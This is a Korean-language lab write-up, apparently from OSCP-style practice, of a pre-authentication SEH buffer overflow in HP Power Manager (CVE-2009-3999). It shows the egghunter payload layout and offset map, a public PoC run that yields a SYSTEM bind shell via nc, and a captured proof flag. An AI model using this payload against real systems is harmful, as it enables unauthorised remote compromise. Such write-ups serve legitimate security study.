⚠️ **msfvenom 출력을 통째로 붙여넣으면 egg(`b33fb33f`)가 날아감.** `-f python` 출력의 첫 줄 `buf =  b""` 가 **대입문**이라 PoC 의 `buf = egg` 를 덮어씀. 그러면 에그헌터가 메모리를 아무리 훑어도 태그를 못 찾아 **영원히 스캔만 하고 셸이 안 붙되 크래시도 에러도 로그도 없음.** `[가정]` 실제로 어떤 방법으로 이식했는지는 기록에 없음 — 익스플로잇이 성공했으므로 **에그는 보존됐다는 것만 확정**임. 이식 방법 셋과 검증 절차는 [[_PLAYBOOK]].

**페이로드 조립** — PoC 가 만드는 버퍼:

```python
buffer  = "\x41" * (721 - len(hunter))   # 721 - 32 = 689
buffer += "\x90"*30 + hunter             # NOP 30 + 에그헌터 32
buffer += "\xeb\xc2\x90\x90"             # JMP SHORT 0xC2
buffer += "\xd5\x74\x41"                 # pop esi # pop ebx # ret 10 (DevManBE.exe)
```

**오프셋 지도**(직접 계산):

```text
오프셋      크기   내용                        역할
─────────────────────────────────────────────────────────────────────
    0 ..  688   689   'A' × 689                 패딩
  689 ..  718    30   \x90 × 30                 NOP 슬레드 ← 여기로 착지한다
  719 ..  750    32   에그헌터                   셸코드를 찾아 점프
  751 ..  754     4   EB C2 90 90               nSEH  ★ 여기가 "실행"된다
  755 ..  757     3   D5 74 41                  SEH   (0x004174d5의 하위 3바이트)
```

- **`Offset => 721` 은 nSEH 까지의 거리가 아님.** 실제 nSEH 는 751바이트 지점임. 721 은 「패딩 + NOP + 에그헌터」의 합이고, 코드가 `721 - len(hunter)` 로 패딩을 정하므로 에그헌터 길이가 얼마든 합계는 항상 721 이 됨. 그 뒤에 NOP 30 이 더해져 751 이 됨
- **`\xeb\xc2` = `jmp short -62`.** `0xC2` 를 부호 있는 8비트로 읽으면 `-62` 임. 점프 명령이 끝난 지점(751+2=753)에서 62 를 빼면 691 — NOP 슬레드(689~718)의 **3번째 바이트**임. 슬레드를 타고 719 의 에그헌터로 들어감
- **SEH 주소를 3바이트만 보냄.** `0x004174d5` 는 리틀엔디언으로 `d5 74 41 00` 이고 마지막이 널임. 널은 문자열을 끊으므로 보낼 수 없어 앞 3바이트만 보내고 나머지는 대상 애플리케이션이 채움 — 모듈 주석이 이것을 명시함:

```ruby
buffer << [target.ret].pack('V*')[0, 3] # SEH (strip the null byte, HP PM will pad it for us)
```

**에그헌터를 쓴 이유** — 스택 버퍼가 셸코드(352바이트)를 담기엔 좁음. 버퍼에는 32바이트 스캐너만 넣고 셸코드는 HTTP `Accept:` 헤더에 둠. 에그헌터가 프로세스 메모리를 훑어 태그 `b33fb33f` 가 연속 두 번 나오는 곳을 찾고 그 바로 뒤로 점프함. 전 메모리를 훑으므로 수 초에서 수십 초가 걸리고, PoC 가 `time.sleep(30)` 을 두는 이유가 이것임. 동작 원리와 판단 기준은 [[_PLAYBOOK]].

**익스플로잇 실행**

```bash
┌──(kali㉿kali)-[~/Kevin/HP-Power-Manager]
└─$ python2 hpm_exploit.py 192.168.60.45

##//#############################################################################################################
##                                                      ##                                               #
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow           #
##                                                      ##  HP Power Manager                             #
## Vulnerable Application: HP Power Manager             ##  This is a part of the Metasploit Module,     #
## Tested on Windows [Version 6.1.7600]                 ##  exploit/windows/http/hp_power_manager_filename#
##                                                      ##                                               #
## Author: Muhammad Haidari                             ##  Spawns a shell to same window                #
## Contact: ghmh@outlook.com                            ##                                               #
## Website: www.github.com/muhammd                      ##                                               #
##                                                      ##                                               #
##//#############################################################################################################
##
##
## TODO: adjust
##
## Usage: python hpm_exploit.py <Remote IP Address>

[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
(UNKNOWN) [192.168.60.45] 1234 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

| 출력 | 내부 동작 |
|---|---|
| `Tested on Windows [Version 6.1.7600]` | 배너가 이 박스와 정확히 같은 빌드를 명시함. 익스플로잇을 고를 때의 강한 신호였음 |
| `[+] Payload Fired...` | `POST /goform/formExportDataLogs` 전송. `fileName` 에 SEH 오버플로우, `Accept:` 에 에그+셸코드 |
| `[+] Give me 30 Sec!` | `time.sleep(30)`. 에그헌터가 프로세스 메모리를 훑는 시간임 — 대기가 아니라 실제로 필요한 시간 |
| `(UNKNOWN) [192.168.60.45] 1234 (?) open` | `nc -nv` 의 출력임. 스크립트가 `os.system("nc -nv 192.168.60.45 1234")` 으로 붙었음. `(UNKNOWN)` 은 역방향 DNS 실패(`-n` 때문), `(?)` 는 1234 에 등록된 서비스명이 없다는 뜻 |
| `Microsoft Windows [Version 6.1.7600]` | 셸코드가 `cmd.exe` 를 띄웠음 |
| `whoami` 가 두 번 보임 | 에코가 없는 원시 소켓 셸이라 내가 친 글자가 그대로 되돌아옴. `nc` 셸의 정상 현상 |
| `nt authority\system` | 처음부터 SYSTEM 임. `DevManBE.exe` 가 SYSTEM 서비스로 돌기 때문 |

`nc` 원시 셸의 제약(Ctrl+C 가 셸을 죽임 · 대화형 프로그램 불가 · Windows 에는 TTY 업그레이드가 없음 · `rlwrap` 이 유일하게 쉬운 개선)은 [[_PLAYBOOK]].

**Local.txt value:**
**없음.** 이 박스의 플래그 슬롯은 **1개**이고 `C:\Users\Administrator\Desktop\proof.txt` 하나임. 익스플로잇이 처음부터 SYSTEM 을 주므로 저권한 단계 자체가 존재하지 않음. ⚠️ 산출물이 남아 있지 않아 `local.txt` **전수 탐색을 실행한 기록은 없음** — 「없음」의 근거는 포털 플래그 슬롯 수와 SYSTEM 직행 경로임.

### Privilege Escalation – 없음 (익스플로잇이 SYSTEM 컨텍스트로 실행됨)

```powershell
C:\Windows\system32>whoami
nt authority\system
```

`DevManBE.exe` 가 **SYSTEM 권한 Windows 서비스로 실행되기 때문**에 그 프로세스 안에서 실행된 셸코드도 SYSTEM 임. 권한상승 취약점 자체가 없고, 근본 원인(서비스를 저권한 계정으로 돌리지 않은 것)은 `Initial Access` 의 `Vulnerability Fix:` 가 이미 담음.

⚠️ Metasploit 모듈의 `'Privileged' => false` 는 **「익스플로잇 실행에 특권이 필요 없다」**는 뜻이지 결과 권한이 낮다는 뜻이 아님.

SYSTEM 이 아니었을 때의 후보 순서(Win7 7600 기준)는 [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]]. [[Squid]] 가 정반대 상황이었음 — `LOCAL SERVICE` 로 떨어져 FullPowers → PrintSpoofer 두 단계가 필요했음.

### Post-Exploitation

```powershell
C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A451-A4B1

 Directory of C:\Users\Administrator\Desktop

07/09/2020  07:24 PM    <DIR>          .
07/09/2020  07:24 PM    <DIR>          ..
06/29/2026  08:59 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)   1,783,939,072 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
4b506d7e0c989b3b7053f9081881a8d3
```

**Proof.txt value:**
`4b506d7e0c989b3b7053f9081881a8d3` — `C:\Users\Administrator\Desktop\proof.txt`

**표준 위치임.** PG Windows 박스의 관례적 위치이고 SYSTEM 권한이면 바로 읽힘(표준 위치가 아닌 사례는 [[Squid]] 의 `C:\local.txt`).

⚠️ **증거 형식이 시험 기준에 미달함** — 위 세션에는 `hostname` 도 `ipconfig` 도 없음. OSCP 는 플래그를 `whoami`·`hostname`·`ipconfig` 와 **한 화면에** 요구하므로 시험이었으면 감점임. cmd 한 줄 형식은 [[_PLAYBOOK#C-3. 플래그·증거]].

**기록의 공백** — 위 출력은 `C:\Windows\system32>whoami` 다음에 곧바로 `C:\Users\Administrator>cd Desktop` 으로 이어짐. `system32` 에서 `C:\Users\Administrator` 로 이동한 명령이 원 노트에 남아 있지 않음(`cd \Users\Administrator` 였을 것이나 재현하지 않았으므로 적지 않음).

**남긴 흔적**

- **타겟 파일시스템 변조 없음** — 셸코드는 메모리에서만 실행됐고 파일을 남기지 않았음
- `DevManBE.exe` 프로세스 상태 — `EXITFUNC=thread` 로 생성했으므로 셸 종료 시 스레드만 죽고 서비스는 살아 있음. **다만 오버플로우로 예외를 발생시켰으므로 프로세스가 불안정할 수 있음** — 랩 반납 전 리버트 권장
- 열린 포트 — 셸코드가 타겟에 1234/tcp 바인드 리스너를 열었음. 세션 종료 후에도 스레드가 남아 있으면 **인증 없는 SYSTEM 셸이 그대로 노출됨.** 실전이라면 반드시 정리 확인이 필요한 항목
- 획득 자격증명 없음 — 자격증명 없이 메모리 손상으로 직접 SYSTEM
- 공격자 VPN IP `192.168.49.60` · 타겟 `192.168.60.45`

## 관련

- **CVE-2009-3999** — HP Power Manager `goform/formExportDataLogs` `fileName` 스택 오버플로우 (CVSSv2 10.0, pre-auth): https://nvd.nist.gov/vuln/detail/CVE-2009-3999
- **CVE-2009-4000** — 같은 엔드포인트·같은 파라미터의 디렉터리 트래버설 (혼동 주의): https://nvd.nist.gov/vuln/detail/CVE-2009-4000
- **CVE-2009-2685** — HP PM 로그인 폼의 `Login` 변수 오버플로우. **이 박스와 무관**: https://nvd.nist.gov/vuln/detail/CVE-2009-2685
- **HP 벤더 게시판 HPSBMA02485 / SSRT090252** (2010-01-19, 수정 버전 4.2.10): http://marc.info/?l=bugtraq&m=126393370331959&w=2
- **Secunia Research SA-2009-47** (발견자 Alin Rad Pop, 원인 기술): https://web.archive.org/web/2016/http://secunia.com/secunia_research/2009-47/
- **Metasploit 모듈 원문** `exploit/windows/http/hp_power_manager_filename` — `Targets`·`BadChars`·`exploit()` 전문: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/hp_power_manager_filename.rb
- 사용한 PoC (python2, bind shell): https://github.com/Muhammd/HP-Power-Manager
- **python3 포크** (reverse shell, Win7 7600에서 테스트됨): https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3
- Exploit-DB 18015: https://www.exploit-db.com/exploits/18015
- `x86/call4_dword_xor` 인코더 원문 (디코더 스텁 대조용): https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/call4_dword_xor.rb
- `Rex::Text.dehex` (`-b` 파싱 규칙, `\x5` 판정 근거): https://github.com/rapid7/rex-text/blob/master/lib/rex/text/hex.rb
- **OSCP+ Exam Guide** — Metasploit 1대 한정 / `msfvenom`·`multi/handler` 전 타겟 허용: https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
- GoAhead WebServer (`websFormDefine` → `/goform/` 라우팅): https://github.com/embedthis/goahead
- skape, "Safely Searching Process Virtual Address Space" — `int 0x2e` 에그헌터 원 논문

- [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다]] · [[_PLAYBOOK#C-1. 정찰 직후]] · [[_PLAYBOOK#C-3. 플래그·증거]] · [[_PLAYBOOK#E. OSCP 시험 규정 — 금지 / 제한 / 허용]]
- [[Osaka]] — 같은 계열의 스택 오버플로우. 거기서는 **포맷 스트링으로 ASLR 을 깨고 ROP 로 DEP 를 우회**하는 한 단계 위 난이도였음. 셸코드를 눈으로 검증하는 규율도 그 노트에서 왔음
- [[Twiggy]] — `filtered` 방화벽 때문에 리버스셸이 실패한 반대 사례. `closed` vs `filtered` 가 셸 방식을 정함
- [[Squid]] — 셸을 잡았을 때 SYSTEM 이 **아니었던** 경우(`LOCAL SERVICE` → FullPowers → PrintSpoofer). `whoami` 한 줄이 갈림길임
- [[Twiggy]] · [[Squid]] · [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] — 누적 패턴 「응답이 성공을 뜻하지 않는다」 / 「조용한 실패가 가장 비싸다」
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] · [[Twiggy]] — 누적 패턴 「버전 판정은 독립 근거 2개」. 여기서는 `smb-os-discovery` + `rdp-ntlm-info` 였음
- [[Jacko]] · [[Slort]] · [[Access]] — msfvenom 페이로드를 쓴 다른 Windows 박스
- [[_STATUS]] — PG 283개 전수 진행현황
- [[_PLAYBOOK#A-1-29. 공개 PoC 가 python2 전용이다 — 최신 Kali 에는 python2 가 없다]] · [[_PLAYBOOK#A-3-15. 익스플로잇은 성공했는데 셸이 «아무 메시지 없이» 안 붙는다 — 에그헌터면 egg 소실부터]] · [[_PLAYBOOK#A-3-16. Windows 원시 `nc` 셸에서는 Ctrl+C 가 셸을 죽인다]] · [[_PLAYBOOK#B-8-10. msfvenom 은 잘못된 인자를 «조용히» 삼킨다 — 출력 3줄로 검증한다]] · [[_PLAYBOOK#B-1-49. 경로 패턴이 웹서버 종류를 말해준다 — `/goform/` 은 임베디드 C 핸들러다]] · [[_PLAYBOOK#B-91. SEH 기반 스택 오버플로우 — 지문 하나로 구조 전체가 읽힌다]] · [[_PLAYBOOK#B-92. 에그헌터 — 버퍼가 셸코드보다 좁을 때의 표준 해법]] · [[_PLAYBOOK#B-93. badchar 는 「셸코드가 실리는 위치의 파서」가 결정한다]] · [[_PLAYBOOK#B-94. 하드코딩 리턴 주소의 «출처»가 OS 이식성을 결정한다]]
